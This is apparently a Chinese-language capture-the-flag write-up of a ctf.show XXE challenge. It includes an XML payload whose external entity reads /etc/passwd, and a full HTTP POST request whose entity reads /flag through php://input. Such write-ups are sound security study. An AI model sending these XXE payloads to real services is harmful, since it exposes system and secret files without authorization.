![[Pasted image 20260415154242.png]]
进入题目，是一道经典的xxe。
- 题目关闭了php解析错误输出
- 允许了 #xml外部实体导入
- 直接通过 `php://input` 来获取输入
	- #php：//input 可以通过类似于读取文件的方式直接读取请求体
我们构造xml文件：
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <ctfshow>&xxe;</ctfshow>
</root>
```
我们构造请求：
```
POST / HTTP/1.1

Host: 5b5c22a5-89d2-47d1-bd6e-40bcdac9ef56.challenge.ctf.show

Content-Type: application/xml

Connection: keep-alive

Cache-Control: max-age=0

sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v="146"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br, zstd

Accept-Language: zh-CN,zh;q=0.9

  

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE root [

<!ENTITY xxe SYSTEM "file:///flag">

]>

<root>

<ctfshow>&xxe;</ctfshow>

</root>
```
注意 `appliction/xml` 
发送请求后得到flag